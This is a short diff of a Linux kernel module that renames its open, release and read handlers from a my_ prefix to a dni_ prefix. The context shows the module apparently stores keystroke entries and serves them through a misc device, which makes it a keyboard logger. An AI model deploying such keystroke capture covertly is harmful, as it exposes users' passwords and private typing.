@@ -21,20 +21,20 @@ static DEFINE_SPINLOCK(log_spinlock);
 
 static atomic_t	device_opened = ATOMIC_INIT(0);
 
-static int	my_open(struct inode *inode, struct file *file)
+static int	dni_open(struct inode *inode, struct file *file)
 {
 	if (atomic_cmpxchg(&device_opened, 0, 1))
 		return -EBUSY;
 	return 0;
 }
 
-static int	my_release(struct inode *inode, struct file *file)
+static int	dni_release(struct inode *inode, struct file *file)
 {
 	atomic_set(&device_opened, 0);
 	return 0;
 }
 
-static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
+static ssize_t	dni_read(struct file *file, char __user *out, size_t len, loff_t *off)
 {
 	struct s_keystroke	*entry;
 	char			*tmp_buf;
@@ -74,9 +74,9 @@ out:
 
 static const struct file_operations fops = {
 	.owner = THIS_MODULE,
-	.open = my_open,
-	.release = my_release,
-	.read = my_read,
+	.open = dni_open,
+	.release = dni_release,
+	.read = dni_read,
 };
 
 static struct miscdevice device = {
